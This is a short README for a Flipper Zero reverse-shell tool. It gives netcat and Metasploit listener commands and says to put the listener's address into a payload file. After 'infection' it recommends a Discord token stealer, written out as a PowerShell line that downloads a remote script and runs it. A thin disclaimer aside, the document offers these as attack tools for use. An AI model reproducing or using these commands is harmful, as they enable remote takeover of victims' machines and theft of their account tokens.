# Reverse shell for Flipperzero

# Setup

1. listener setup
```
$ nc -nvlp <port_number>
```
or metasploit
```
$ use multi/handler
$ set payload windows/x64/shell/reverse_tcp
$ set lhost <ip address>
$ set lport <port number>
$ run
```

2. Insert the IP address and Port of your listener into the ReverseShell.txt file

# Disclaimer
I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.

# Have fun!
• Additional payloads after infection
  - Discord Token Stealer
    (iwr https://raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt).Content | iex
